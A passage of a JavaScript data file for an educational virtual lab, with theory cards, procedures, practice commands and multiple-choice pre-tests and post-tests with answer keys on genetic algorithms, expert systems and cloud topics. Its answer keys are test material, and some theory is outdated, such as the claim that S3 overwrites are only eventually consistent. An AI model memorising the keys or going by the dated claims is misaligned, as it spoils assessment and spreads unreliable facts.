            "q": "Mutation in GA prevents:",
            "options": [
                "Convergence",
                "Premature convergence (loss of diversity)",
                "Crossover from occurring",
                "Fitness evaluation"
            ],
            "correct": 1
        },
        {
            "q": "Elitism ensures:",
            "options": [
                "All individuals mutate",
                "Best solution is preserved to next generation",
                "Population size doubles",
                "No crossover occurs"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Set the target function (e.g., maximize f(x) = x·sin(10πx) + 2 on [−1, 2]).",
        "2. Configure GA parameters: population size, crossover rate, mutation rate.",
        "3. Click 'Initialize Population' — random chromosomes plotted on function graph.",
        "4. Click 'Evolve Generation' — selection, crossover, mutation applied, new population shown.",
        "5. Watch the fitness plot converge toward the global maximum over 50+ generations."
    ],
    "posttest": [
        {
            "q": "Increasing mutation rate too high causes:",
            "options": [
                "Faster convergence",
                "Random search (loss of learned structure)",
                "Elitism failure",
                "No selection pressure"
            ],
            "correct": 1
        },
        {
            "q": "Schema theorem explains:",
            "options": [
                "Why crossover works",
                "Why short, low-order, above-average schemata grow exponentially",
                "Mutation rate selection",
                "Population size requirements"
            ],
            "correct": 1
        },
        {
            "q": "GA with binary encoding uses which crossover type most commonly?",
            "options": [
                "Gaussian",
                "Single-point or two-point crossover",
                "Uniform crossover only",
                "No crossover"
            ],
            "correct": 1
        },
        {
            "q": "The 'No Free Lunch' theorem states:",
            "options": [
                "GAs always outperform gradient methods",
                "No algorithm outperforms all others on all problems",
                "All optimization algorithms are equivalent",
                "GAs are computationally free"
            ],
            "correct": 1
        },
        {
            "q": "Multi-objective GA (NSGA-II) is used for:",
            "options": [
                "Single objective optimization",
                "Problems with multiple conflicting objectives (Pareto front)",
                "Binary classification",
                "Constraint satisfaction"
            ],
            "correct": 1
        }
    ],
    "simType": "ai_genetic",
    "practice_commands": [
        "python ga_optimize.py --func rastrigin --pop 100 --gen 200",
        "python ga_tsp.py --cities 20"
    ],
    "practice_questions": [
        "Apply a GA to solve the Travelling Salesman Problem (TSP) with 10 cities.",
        "Explain the Schema Theorem and its implications for GA convergence."
    ]
};

window.VLAB_DATA.ai_expert = {
    "title": "Expert System with Rule Engine",
    "aim": "To build and simulate a forward-chaining rule-based Expert System, demonstrating knowledge base construction, inference engine operation, conflict resolution, and expert reasoning for medical diagnosis.",
    "theory": {
        "intro": "An Expert System (ES) captures human expert knowledge in a formal rule base and uses an inference engine to derive conclusions. It consists of a Knowledge Base (production rules: IF condition THEN action), a Working Memory (facts), and an Inference Engine (forward or backward chaining). Expert Systems were prominent in 1980s AI for medical diagnosis (MYCIN), chemical analysis (DENDRAL), and configuration (XCON).",
        "cards": [
            {
                "title": "1. Production Rules & Working Memory",
                "content": "Rules: IF <condition> THEN <action/conclusion>\nExample: IF fever AND cough AND sore_throat THEN diagnose('flu')\nWorking Memory: Dynamic set of facts (assertions). Initially contains observed symptoms/facts."
            },
            {
                "title": "2. Forward Chaining (Data-Driven)",
                "content": "Starts with known facts, applies rules to derive new facts until goal is reached.\n1. Match rules against working memory (Pattern Matching)\n2. Select a matching rule (Conflict Resolution: Rete algorithm)\n3. Fire the rule — add conclusion to working memory\n4. Repeat until no more rules fire or goal reached\nUsed for: Monitoring, classification, configuration"
            },
            {
                "title": "3. Backward Chaining (Goal-Driven)",
                "content": "Starts with a goal and works backward to find supporting facts.\nUsed in: Prolog, MYCIN (medical diagnosis)\n1. Goal: prove 'patient has flu'\n2. Find rules with 'flu' in conclusion\n3. Set rule's conditions as sub-goals\n4. Repeat until all sub-goals proven by facts or user input\nUsed for: Diagnosis, troubleshooting, planning"
            }
        ]
    },
    "pretest": [
        {
            "q": "An Expert System's Knowledge Base contains:",
            "options": [
                "Raw data",
                "Production rules and facts",
                "Neural network weights",
                "Decision trees"
            ],
            "correct": 1
        },
        {
            "q": "Forward chaining is also called:",
            "options": [
                "Goal-driven reasoning",
                "Data-driven reasoning",
                "Backward inference",
                "Rule elimination"
            ],
            "correct": 1
        },
        {
            "q": "Backward chaining starts with:",
            "options": [
                "Known facts",
                "A goal to prove",
                "All possible conclusions",
                "Pattern matching"
            ],
            "correct": 1
        },
        {
            "q": "The Rete algorithm improves Expert System performance by:",
            "options": [
                "Caching partial pattern matches to avoid re-evaluation",
                "Reducing number of rules",
                "Increasing working memory",
                "Using neural networks"
            ],
            "correct": 0
        },
        {
            "q": "MYCIN was an Expert System for:",
            "options": [
                "Chess playing",
                "Medical diagnosis of blood infections",
                "Engineering design",
                "Stock trading"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the pre-loaded medical Knowledge Base (symptoms → diagnoses).",
        "2. Enter patient symptoms by checking checkboxes (e.g., fever, cough, fatigue).",
        "3. Click 'Run Forward Chaining' — watch rules fire one by one in the inference log.",
        "4. Observe new facts added to Working Memory after each rule fires.",
        "5. View the final diagnosis reached and the chain of reasoning steps."
    ],
    "posttest": [
        {
            "q": "Conflict resolution in Expert Systems determines:",
            "options": [
                "Which database to query",
                "Which rule to fire when multiple rules match",
                "Backward vs forward chaining mode",
                "Number of rules to use"
            ],
            "correct": 1
        },
        {
            "q": "An Expert System explanation facility provides:",
            "options": [
                "Better database performance",
                "Reasoning trace showing WHY a conclusion was reached",
                "Automatic rule generation",
                "Neural network training"
            ],
            "correct": 1
        },
        {
            "q": "Uncertainty handling in Expert Systems uses:",
            "options": [
                "Certainty factors (MYCIN) or Bayesian networks",
                "Hard boolean rules only",
                "Neural backpropagation",
                "K-means clustering"
            ],
            "correct": 0
        },
        {
            "q": "Knowledge Acquisition bottleneck refers to:",
            "options": [
                "Slow inference",
                "Difficulty of extracting and encoding expert knowledge into rules",
                "Memory limitations",
                "Network latency"
            ],
            "correct": 1
        },
        {
            "q": "Which of these is NOT a limitation of Expert Systems?",
            "options": [
                "Brittle outside their domain",
                "Cannot learn from new data",
                "Fast inference on structured domains",
                "High maintenance cost for knowledge base updates"
            ],
            "correct": 2
        }
    ],
    "simType": "ai_expert",
    "practice_commands": [
        "python expert_system.py --kb medical_rules.json --facts 'fever,cough'",
        "python prolog_like.py --goal 'diagnose(flu)'"
    ],
    "practice_questions": [
        "Design a rule-based Expert System for network fault diagnosis with 10+ rules.",
        "Compare forward chaining and backward chaining with a concrete diagnosis example."
    ]
};

window.VLAB_DATA.cloud_intro = {
    "title": "Cloud Computing Fundamentals & Service Models",
    "aim": "To understand cloud computing concepts, explore IaaS, PaaS, and SaaS service models, and identify real-world deployment scenarios for each model.",
    "theory": {
        "intro": "Cloud computing delivers computing resources (servers, storage, databases, networking, software, analytics) over the Internet on a pay-as-you-go basis. It eliminates the need to own physical data centers, enabling rapid provisioning and global scale. The three fundamental service models define the level of management responsibility split between the provider and consumer.",
        "cards": [
            {
                "title": "1. IaaS — Infrastructure as a Service",
                "content": "Provides virtualized computing infrastructure over the internet.\n• Consumer controls: OS, storage, deployed apps, networking\n• Provider controls: Physical hardware, hypervisor\n• Examples: AWS EC2, Google Compute Engine, Azure VMs\n• Use cases: Hosting websites, running custom applications, development/test environments"
            },
            {
                "title": "2. PaaS — Platform as a Service",
                "content": "Provides a platform for developers to build, deploy, and manage applications without managing infrastructure.\n• Consumer controls: Deployed applications and data\n• Provider controls: OS, runtime, middleware, networking\n• Examples: AWS Elastic Beanstalk, Google App Engine, Heroku, Azure App Service\n• Use cases: Web/mobile app development, API development, microservices"
            },
            {
                "title": "3. SaaS — Software as a Service",
                "content": "Delivers complete applications over the internet, managed entirely by the provider.\n• Consumer controls: User data and configuration settings\n• Provider controls: Everything else (infra, OS, app code)\n• Examples: Gmail, Salesforce, Zoom, Microsoft 365, Dropbox\n• Use cases: Email, CRM, collaboration, office productivity"
            },
            {
                "title": "4. Deployment Models",
                "content": "• Public Cloud: Resources owned and operated by third-party provider, shared over public internet (AWS, Azure, GCP)\n• Private Cloud: Dedicated infrastructure for single organization (on-premises or hosted)\n• Hybrid Cloud: Combination of public + private, connected by secure link\n• Multi-Cloud: Use of multiple public cloud providers simultaneously"
            }
        ]
    },
    "pretest": [
        {
            "q": "Which service model gives the consumer maximum control over the infrastructure?",
            "options": [
                "SaaS",
                "PaaS",
                "IaaS",
                "FaaS"
            ],
            "correct": 2
        },
        {
            "q": "Google App Engine is an example of:",
            "options": [
                "IaaS",
                "PaaS",
                "SaaS",
                "Private Cloud"
            ],
            "correct": 1
        },
        {
            "q": "In cloud computing, 'elasticity' means:",
            "options": [
                "Physical hardware scalability",
                "Automatic scaling of resources up or down based on demand",
                "Fixed resource allocation",
                "Geographic distribution"
            ],
            "correct": 1
        },
        {
            "q": "Which deployment model uses resources shared among multiple organizations?",
            "options": [
                "Private Cloud",
                "Hybrid Cloud",
                "Public Cloud",
                "Community Cloud"
            ],
            "correct": 2
        },
        {
            "q": "The primary economic model of cloud computing is:",
            "options": [
                "One-time purchase",
                "Pay-as-you-go / OPEX model",
                "Hardware leasing",
                "Subscription-only"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the service model comparison table in the simulator.",
        "2. Drag and drop workload scenarios (e.g., 'Run a custom database', 'Host a website') to the correct service model box.",
        "3. Click 'Check' to validate your assignments.",
        "4. Explore the shared responsibility matrix for each model.",
        "5. Use the deployment model selector to compare public, private, hybrid cloud architectures."
    ],
    "posttest": [
        {
            "q": "A company wants to run its ERP software without managing servers. Which model fits?",
            "options": [
                "IaaS",
                "PaaS",
                "SaaS",
                "Bare metal"
            ],
            "correct": 2
        },
        {
            "q": "The 'shared responsibility model' in cloud security means:",
            "options": [
                "Provider is responsible for everything",
                "Consumer is responsible for everything",
                "Responsibility is split between provider and consumer",
                "Security is optional"
            ],
            "correct": 2
        },
        {
            "q": "Multitenancy in cloud computing means:",
            "options": [
                "Multiple clouds used simultaneously",
                "Multiple customers share the same physical infrastructure",
                "Multiple data centers per region",
                "Multiple VMs per customer"
            ],
            "correct": 1
        },
        {
            "q": "Which cloud model is best for organizations with strict data sovereignty requirements?",
            "options": [
                "Public Cloud",
                "Community Cloud",
                "Private Cloud",
                "Hybrid Cloud"
            ],
            "correct": 2
        },
        {
            "q": "Serverless computing (FaaS) extends which model's concept?",
            "options": [
                "IaaS",
                "PaaS",
                "SaaS",
                "It is completely separate"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_intro",
    "practice_commands": [
        "aws ec2 describe-instances",
        "gcloud compute instances list",
        "az vm list"
    ],
    "practice_questions": [
        "Compare total cost of ownership (TCO) between on-premises and cloud infrastructure.",
        "Explain the shared responsibility model for AWS S3 bucket security."
    ]
};

window.VLAB_DATA.cloud_virtualization = {
    "title": "Virtualization & Hypervisors",
    "aim": "To understand hardware virtualization, compare Type-1 and Type-2 hypervisors, and simulate VM lifecycle management including creation, suspension, and migration.",
    "theory": {
        "intro": "Virtualization is the foundation of cloud computing. It abstracts physical hardware resources to create multiple isolated virtual environments (Virtual Machines). A hypervisor (Virtual Machine Monitor) manages this abstraction, allowing multiple OSes to run on a single physical host, improving utilization and enabling cloud resource pooling.",
        "cards": [
            {
                "title": "1. Type-1 (Bare-Metal) Hypervisors",
                "content": "Run directly on physical hardware without a host OS.\n• Examples: VMware ESXi, Microsoft Hyper-V, Xen, KVM\n• Advantages: Better performance, direct hardware access, higher security isolation\n• Used in: Enterprise data centers, cloud providers (AWS uses Xen/KVM)\n• Disadvantage: Requires hardware-level configuration"
            },
            {
                "title": "2. Type-2 (Hosted) Hypervisors",
                "content": "Run as an application on top of a host OS.\n• Examples: VirtualBox, VMware Workstation, Parallels\n• Advantages: Easy installation, good for development and testing\n• Disadvantage: Performance overhead — guest OS → hypervisor → host OS → hardware\n• Used in: Developer workstations, desktop virtualization"
            },
            {
                "title": "3. VM Components & Isolation",
                "content": "Each VM contains:\n• Virtual CPU (vCPU): Mapped to physical CPU cores via scheduler\n• Virtual RAM: Allocated from physical memory pool\n• Virtual Disk: Stored as image files (.vmdk, .vhd, .qcow2)\n• Virtual NIC: Connected via virtual switch\nIsolation: VMs are fully isolated — a crash in one VM doesn't affect others."
            },
            {
                "title": "4. Containers vs VMs",
                "content": "Containers (Docker, Kubernetes) share the host OS kernel:\n• Lighter: No full OS per container (MBs vs GBs)\n• Faster startup: Milliseconds vs minutes\n• Less isolated: Shared kernel (security concern)\n• VMs provide stronger isolation for multi-tenant clouds\n• Modern clouds use both: VMs for isolation + containers for density"
            }
        ]
    },
    "pretest": [
        {
            "q": "A Type-1 hypervisor runs:",
            "options": [
                "On top of a host OS",
                "Directly on physical hardware",
                "Inside a container",
                "On a virtual machine"
            ],
            "correct": 1
        },
        {
            "q": "Which is an example of a Type-2 hypervisor?",
            "options": [
                "VMware ESXi",
                "KVM",
                "Oracle VirtualBox",
                "Xen"
            ],
            "correct": 2
        },
        {
            "q": "What enables multiple VMs to share a single physical CPU?",
            "options": [
                "Memory paging",
                "vCPU scheduling by the hypervisor",
                "Container namespaces",
                "Virtual NIC"
            ],
            "correct": 1
        },
        {
            "q": "VM snapshot preserves:",
            "options": [
                "Only the VM's disk",
                "The complete VM state (CPU, RAM, disk) at a point in time",
                "The VM configuration only",
                "Network settings only"
            ],
            "correct": 1
        },
        {
            "q": "Containers are lighter than VMs because:",
            "options": [
                "They use less RAM per app",
                "They share the host OS kernel instead of running a full OS",
                "They have no networking",
                "They use Type-1 hypervisors"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. View the physical server with available CPU cores, RAM, and storage.",
        "2. Click 'Create VM' and allocate vCPUs, RAM, and disk size.",
        "3. Observe the resource pools shrink as VMs are provisioned.",
        "4. Pause a VM (suspend) and observe its state saved to disk.",
        "5. Migrate a VM between two simulated physical hosts (live migration demo)."
    ],
    "posttest": [
        {
            "q": "Live migration of a VM allows:",
            "options": [
                "Moving a running VM between hosts with no downtime",
                "Copying VM disk only",
                "Restarting a VM on new hardware",
                "Cloning a VM"
            ],
            "correct": 0
        },
        {
            "q": "Memory ballooning in virtualization:",
            "options": [
                "Increases physical RAM",
                "Allows hypervisor to reclaim idle memory from VMs",
                "Compresses VM memory",
                "Duplicates memory for redundancy"
            ],
            "correct": 1
        },
        {
            "q": "The hypervisor's CPU scheduler prevents VMs from:",
            "options": [
                "Using the network",
                "Monopolizing physical CPUs for extended periods",
                "Accessing disk storage",
                "Communicating with each other"
            ],
            "correct": 1
        },
        {
            "q": "Para-virtualization requires:",
            "options": [
                "No guest OS modification",
                "Guest OS modification to use hypervisor APIs directly",
                "Hardware VT-x support",
                "Container runtime"
            ],
            "correct": 1
        },
        {
            "q": "Which file format is used for VMware virtual disk images?",
            "options": [
                ".vhd",
                ".qcow2",
                ".vmdk",
                ".ova"
            ],
            "correct": 2
        }
    ],
    "simType": "cloud_virtualization",
    "practice_commands": [
        "virsh list --all",
        "virsh start vm1",
        "virsh migrate vm1 qemu+ssh://host2/system"
    ],
    "practice_questions": [
        "Calculate maximum VM density on a 32-core, 256GB RAM server with 4 vCPUs and 8GB RAM per VM.",
        "Explain the overhead sources in Type-2 hypervisors vs Type-1."
    ]
};

window.VLAB_DATA.cloud_loadbalancer = {
    "title": "Load Balancing Algorithms",
    "aim": "To implement and compare Round Robin, Least Connections, and IP Hash load balancing algorithms, observing how incoming requests are distributed across backend servers.",
    "theory": {
        "intro": "Load balancing distributes incoming network traffic across multiple backend servers (server pool) to ensure no single server is overwhelmed, improving availability and responsiveness. Cloud load balancers operate at Layer 4 (TCP/UDP) or Layer 7 (HTTP/HTTPS) and are critical for scalable, fault-tolerant cloud applications.",
        "cards": [
            {
                "title": "1. Round Robin",
                "content": "Requests are distributed sequentially across servers in rotation.\n• Simple, equal distribution\n• Works well when servers have similar capacity and request processing time\n• Weighted Round Robin: Servers with higher capacity receive proportionally more requests\n• Limitation: Ignores current server load"
            },
            {
                "title": "2. Least Connections",
                "content": "New requests are sent to the server with the fewest active connections.\n• Better for varying request durations (long-running connections)\n• Adaptively balances load based on actual server state\n• Weighted Least Connections: Accounts for server capacity differences\n• Used by: Nginx, HAProxy, AWS ALB"
            },
            {
                "title": "3. IP Hash (Sticky Sessions)",
                "content": "Client IP address is hashed to consistently route requests to the same server.\n• hash(client_IP) mod N → server index\n• Ensures session persistence (same client always reaches same server)\n• Useful for: Shopping carts, user sessions without shared state\n• Limitation: Uneven distribution if few IP prefixes dominate traffic"
            },
            {
                "title": "4. Cloud Load Balancer Types",
                "content": "• AWS ALB (Application): Layer 7, content-based routing, path/host rules\n• AWS NLB (Network): Layer 4, ultra-low latency, TCP/UDP\n• AWS CLB (Classic): Legacy Layer 4+7\n• Azure Load Balancer: Layer 4\n• Google Cloud Load Balancing: Global anycast, Layer 7\n• Health Checks: Automatically removes unhealthy servers from the pool"
            }
        ]
    },
    "pretest": [
        {
            "q": "Round Robin load balancing distributes requests:",
            "options": [
                "By server CPU load",
                "Sequentially in rotation across servers",
                "By client IP hash",
                "To the fastest server"
            ],
            "correct": 1
        },
        {
            "q": "Least Connections algorithm is best suited for:",
            "options": [
                "Uniform short requests",
                "Requests with highly variable processing times",
                "Stateful sessions",
                "UDP traffic only"
            ],
            "correct": 1
        },
        {
            "q": "IP Hash load balancing ensures:",
            "options": [
                "Equal distribution always",
                "The same client always reaches the same server",
                "Load based on server CPU",
                "Failover to fastest server"
            ],
            "correct": 1
        },
        {
            "q": "A Layer 7 load balancer operates at which OSI layer?",
            "options": [
                "Transport (Layer 4)",
                "Network (Layer 3)",
                "Application (Layer 7)",
                "Data Link (Layer 2)"
            ],
            "correct": 2
        },
        {
            "q": "Health checks in load balancing:",
            "options": [
                "Monitor client IPs",
                "Detect and remove failed servers from the pool",
                "Optimize routing tables",
                "Encrypt traffic"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Configure 3 backend servers with different current load (connections).",
        "2. Select an algorithm (Round Robin, Least Connections, IP Hash).",
        "3. Click 'Send Request' multiple times to see which server receives each request.",
        "4. Observe the connection count and request distribution chart.",
        "5. Simulate a server failure and watch the load balancer reroute traffic."
    ],
    "posttest": [
        {
            "q": "Weighted Round Robin assigns more requests to servers with:",
            "options": [
                "Lower IP addresses",
                "Higher weight values (greater capacity)",
                "Fewer active connections",
                "Newer provisioning dates"
            ],
            "correct": 1
        },
        {
            "q": "A 'sticky session' in load balancing means:",
            "options": [
                "Session stored in database",
                "Client always routed to the same backend server",
                "Server holds connection open",
                "Request retried on failure"
            ],
            "correct": 1
        },
        {
            "q": "Global Server Load Balancing (GSLB) routes traffic based on:",
            "options": [
                "Server weight only",
                "Geographic proximity and latency of data centers",
                "Alphabetical server order",
                "Oldest connection"
            ],
            "correct": 1
        },
        {
            "q": "Connection draining (deregistration delay) ensures:",
            "options": [
                "New connections go to draining server",
                "Existing connections complete before server is removed from pool",
                "Servers reconnect automatically",
                "Client retries indefinitely"
            ],
            "correct": 1
        },
        {
            "q": "AWS ALB can route requests based on:",
            "options": [
                "IP address only",
                "URL path, hostname, HTTP headers, and query strings",
                "Round robin only",
                "Connection count"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_loadbalancer",
    "practice_commands": [
        "aws elbv2 describe-load-balancers",
        "nginx -t && nginx -s reload",
        "curl -H 'Host: app.example.com' http://lb-ip/api"
    ],
    "practice_questions": [
        "Design a load balancing strategy for a stateful web application with 10,000 concurrent users.",
        "Explain how AWS ALB path-based routing enables microservices architecture."
    ]
};

window.VLAB_DATA.cloud_autoscaling = {
    "title": "Auto-Scaling & Elasticity",
    "aim": "To simulate cloud auto-scaling mechanisms, demonstrating scale-out and scale-in policies based on CPU utilization thresholds, and observing how elasticity handles variable workloads.",
    "theory": {
        "intro": "Auto-scaling automatically adjusts the number of compute instances based on predefined policies or metrics. This is a core cloud property (elasticity) enabling applications to handle demand spikes without manual intervention, and to reduce costs during low-traffic periods. Cloud auto-scaling groups monitor metrics and trigger scaling actions.",
        "cards": [
            {
                "title": "1. Horizontal vs Vertical Scaling",
                "content": "Horizontal (Scale Out/In):\n• Add/remove instances from a group\n• No downtime, highly preferred for stateless apps\n• Example: EC2 Auto Scaling, GKE Horizontal Pod Autoscaler\n\nVertical (Scale Up/Down):\n• Increase/decrease instance size (CPU/RAM)\n• Requires restart (brief downtime)\n• Limited by maximum instance size\n• Example: RDS instance type change"
            },
            {
                "title": "2. Scaling Policies",
                "content": "Target Tracking: Maintain a metric at a target value (e.g., keep CPU at 60%)\nStep Scaling: Add/remove specific instance counts at defined thresholds\n• CPU 70-80% → add 1 instance\n• CPU 80-90% → add 3 instances\n• CPU >90% → add 5 instances\nScheduled Scaling: Pre-scale based on predictable load patterns (e.g., 9AM daily)"
            },
            {
                "title": "3. Cooldown Period & Warmup",
                "content": "Cooldown Period: Time after a scaling action during which no further scaling occurs (prevents thrashing).\nInstance Warmup: Time for a new instance to initialize before receiving traffic and contributing to metrics.\nMinimum/Maximum/Desired Capacity:\n• Min: Floor for instance count (ensures availability)\n• Max: Ceiling (controls cost)\n• Desired: Current target count"
            }
        ]
    },
    "pretest": [
        {
            "q": "Horizontal scaling adds:",
            "options": [
                "More CPU to existing instance",
                "More instances to the pool",
                "More RAM to existing instance",
                "More storage only"
            ],
            "correct": 1
        },
        {
            "q": "Auto-scaling 'scale-in' refers to:",
            "options": [
                "Adding more instances",
                "Removing instances when load decreases",
                "Vertical scaling up",
                "Instance type upgrade"
            ],
            "correct": 1
        },
        {
            "q": "The cooldown period in auto-scaling prevents:",
            "options": [
                "Instance failure",
                "Rapid, oscillating scaling actions (thrashing)",
                "Traffic spikes",
                "Metric collection"
            ],
            "correct": 1
        },
        {
            "q": "Which metric is most commonly used to trigger auto-scaling?",
            "options": [
                "Network latency",
                "Disk I/O",
                "CPU utilization",
                "Memory type"
            ],
            "correct": 2
        },
        {
            "q": "Target Tracking scaling policy maintains:",
            "options": [
                "Fixed instance count",
                "A specific metric at a target value",
                "Cost at a minimum",
                "Equal load on all instances"
            ],
            "correct": 1
        }
    ],
    "procedure": [
        "1. Set the minimum (2), maximum (8), and desired (3) instance counts.",
        "2. Configure scale-out at CPU > 70% and scale-in at CPU < 30%.",
        "3. Use the load slider to simulate incoming traffic spikes.",
        "4. Watch instances automatically added (scale-out) and CPU drop.",
        "5. Reduce load and observe scale-in after the cooldown timer expires."
    ],
    "posttest": [
        {
            "q": "Predictive auto-scaling uses:",
            "options": [
                "Reactive metric thresholds only",
                "Machine learning to anticipate load changes and pre-scale",
                "Manual administrator input",
                "Fixed schedules only"
            ],
            "correct": 1
        },
        {
            "q": "An auto-scaling group's desired capacity represents:",
            "options": [
                "Maximum allowed instances",
                "Minimum required instances",
                "Current target number of instances",
                "Instances currently in use"
            ],
            "correct": 2
        },
        {
            "q": "Instance warmup time affects auto-scaling because:",
            "options": [
                "Warm instances use more CPU",
                "New instances should not be counted in metrics until fully initialized",
                "Warmup increases instance size",
                "It prevents scale-in events"
            ],
            "correct": 1
        },
        {
            "q": "Scheduled scaling is ideal for:",
            "options": [
                "Unpredictable random traffic spikes",
                "Predictable, recurring traffic patterns (e.g., daily business hours)",
                "Database auto-scaling",
                "Network packet spikes"
            ],
            "correct": 1
        },
        {
            "q": "The Kubernetes Horizontal Pod Autoscaler (HPA) scales based on:",
            "options": [
                "Node CPU only",
                "Pod CPU/memory utilization or custom metrics",
                "Number of namespaces",
                "Docker image size"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_autoscaling",
    "practice_commands": [
        "aws autoscaling describe-auto-scaling-groups",
        "kubectl autoscale deployment app --min=2 --max=10 --cpu-percent=60",
        "aws autoscaling put-scaling-policy --policy-type TargetTrackingScaling"
    ],
    "practice_questions": [
        "Design an auto-scaling policy for an e-commerce site expecting 10x traffic during Black Friday sales.",
        "Explain the cost trade-off between aggressive scale-in and maintaining a warm instance buffer."
    ]
};

window.VLAB_DATA.cloud_storage = {
    "title": "Cloud Storage Types (Object, Block, File)",
    "aim": "To compare object storage, block storage, and file storage services, understand their use cases, access patterns, and explore object storage consistency models.",
    "theory": {
        "intro": "Cloud storage comes in three fundamental types, each optimized for different workloads. Choosing the right storage type is critical for performance, cost, and scalability in cloud architectures.",
        "cards": [
            {
                "title": "1. Object Storage",
                "content": "Stores data as objects (data + metadata + unique key) in flat address space.\n• Examples: AWS S3, Google Cloud Storage, Azure Blob Storage\n• Access: REST API (HTTP PUT/GET/DELETE)\n• Scalability: Unlimited, highly durable (11 9s in S3)\n• Use cases: Backups, media files, static websites, data lakes, archives\n• No file system hierarchy — uses key prefixes to simulate folders"
            },
            {
                "title": "2. Block Storage",
                "content": "Stores data as fixed-size blocks, presented as raw disk volumes to VMs.\n• Examples: AWS EBS, Google Persistent Disk, Azure Managed Disks\n• Access: Via OS filesystem (like a physical hard drive)\n• Low latency: Sub-millisecond access for databases\n• Use cases: Database storage (MySQL, PostgreSQL), boot volumes, high IOPS workloads\n• Tied to a single VM (usually)"
            },
            {
                "title": "3. File Storage (NAS)",
                "content": "Provides shared file system accessible by multiple compute instances simultaneously.\n• Examples: AWS EFS, Google Filestore, Azure Files\n• Access: NFS, SMB/CIFS protocols\n• Use cases: Shared application data, CMS, home directories, HPC scratch space\n• Scales automatically (EFS), higher latency than block storage"
            },
            {
                "title": "4. S3 Storage Classes & Consistency",
                "content": "S3 Storage Classes by cost/access:\n• S3 Standard: Frequent access, millisecond latency\n• S3-IA (Infrequent Access): Lower cost, retrieval fee\n• S3 Glacier: Archive, minutes-hours retrieval\n• S3 Glacier Deep Archive: Lowest cost, 12-48 hour retrieval\n\nConsistency: AWS S3 provides strong read-after-write consistency for new objects and eventual consistency for overwrite operations."
            }
        ]
    },
    "pretest": [
        {
            "q": "AWS S3 is an example of:",
            "options": [
                "Block storage",
                "File storage",
                "Object storage",
                "Archive tape storage"
            ],
            "correct": 2
        },
        {
            "q": "Block storage is preferred for databases because:",
            "options": [
                "It is cheaper than object storage",
                "It provides low-latency, high-IOPS access like a local disk",
                "It supports NFS protocol",
                "It scales to unlimited capacity automatically"
            ],
            "correct": 1
        },
        {
            "q": "Which storage type allows multiple VMs to mount the same volume simultaneously?",
            "options": [
                "Block storage (EBS)",
                "Object storage (S3)",
                "File storage (EFS)",
                "Instance store"
            ],
            "correct": 2
        },
        {
            "q": "S3 Glacier is designed for:",
            "options": [
                "Frequently accessed data",
                "Low-latency database operations",
                "Long-term archival with infrequent access",
                "Real-time streaming"
            ],
            "correct": 2
        },
        {
            "q": "Object storage uses which access method?",
            "options": [
                "POSIX filesystem calls",
                "iSCSI block protocol",
                "REST API (HTTP)",
                "SMB/CIFS protocol"
            ],
            "correct": 2
        }
    ],
    "procedure": [
        "1. View the three storage type comparison cards.",
        "2. Upload a file to the simulated S3 bucket and observe the object key structure.",
        "3. Switch to block storage — format a volume and write data, observing IOPS.",
        "4. Mount the simulated EFS volume from two simultaneous clients.",
        "5. Test S3 storage class transitions: Standard → IA → Glacier lifecycle rules."
    ],
    "posttest": [
        {
            "q": "An S3 bucket policy differs from an IAM policy in that:",
            "options": [
                "S3 bucket policies are faster",
                "S3 bucket policies are resource-based and can grant cross-account access",
                "IAM policies are applied to buckets only",
                "S3 bucket policies replace IAM completely"
            ],
            "correct": 1
        },
        {
            "q": "AWS EBS volumes are:",
            "options": [
                "Globally distributed by default",
                "Tied to a specific Availability Zone",
                "Accessible from any region",
                "Automatically replicated across regions"
            ],
            "correct": 1
        },
        {
            "q": "Instance store (ephemeral storage) is lost when:",
            "options": [
                "Volume is unmounted",
                "Instance is stopped or terminated",
                "A snapshot is taken",
                "Region is changed"
            ],
            "correct": 1
        },
        {
            "q": "S3 Intelligent-Tiering automatically:",
            "options": [
                "Deletes infrequently accessed objects",
                "Moves objects between access tiers based on usage patterns",
                "Compresses all objects",
                "Encrypts objects by default"
            ],
            "correct": 1
        },
        {
            "q": "A CRR (Cross-Region Replication) rule in S3 is used for:",
            "options": [
                "Backup within the same region",
                "Replicating objects to another AWS region for DR",
                "Compressing objects",
                "Setting access permissions"
            ],
            "correct": 1
        }
    ],
    "simType": "cloud_storage",
    "practice_commands": [
        "aws s3 cp file.txt s3://my-bucket/",
        "aws s3 ls s3://my-bucket/",
        "aws ec2 create-volume --size 100 --availability-zone us-east-1a"
    ],
    "practice_questions": [
        "Design a data tiering strategy for a media company storing 1PB of video assets.",
        "Explain the trade-offs between S3 Standard-IA and S3 Glacier for backup storage."
    ]
};

window.VLAB_DATA.cloud_docker = {
    "title": "Containerization with Docker",
    "aim": "To understand Docker containerization concepts, simulate building a Docker image from a Dockerfile, running containers, and managing container networking and volumes.",
    "theory": {
        "intro": "Docker is the leading containerization platform. Containers package an application with all its dependencies into a portable, isolated unit that runs consistently across environments. Unlike VMs, containers share the host OS kernel, making them lightweight (MBs vs GBs) and fast to start (milliseconds vs minutes).",
        "cards": [
            {
                "title": "1. Docker Architecture",
                "content": "Docker uses a client-server architecture:\n• Docker Client: CLI tool (docker run, docker build, docker pull)\n• Docker Daemon (dockerd): Background service managing containers\n• Docker Registry: Image repository (Docker Hub, ECR, GCR)\n• Images: Read-only layered filesystem blueprint\n• Containers: Running instances of images\n\nImage layers (Union FS): Each Dockerfile instruction adds a new read-only layer. The container adds a writable layer on top."
            },
            {
                "title": "2. Dockerfile Instructions",
                "content": "FROM ubuntu:22.04          # Base image\nRUN apt-get install -y python3  # Install packages\nCOPY app.py /app/          # Copy files\nWORKDIR /app               # Set working directory\nEXPOSE 8080               # Document port\nENV NODE_ENV=production    # Set env variable\nCMD ['python3', 'app.py'] # Default command\n\nBest practices: Use specific base image tags, minimize layers with &&, use .dockerignore"
            },
            {
                "title": "3. Container Networking",
                "content": "Docker network drivers:\n• bridge (default): Isolated network, containers communicate via docker0 bridge\n• host: Container shares host network stack (best performance)\n• overlay: Multi-host networking for Docker Swarm/K8s\n• none: No networking\n\nPort mapping: -p 8080:80 maps host port 8080 → container port 80\nDNS: Containers on the same network resolve each other by container name"
            },
            {
                "title": "4. Docker Volumes & Data Persistence",
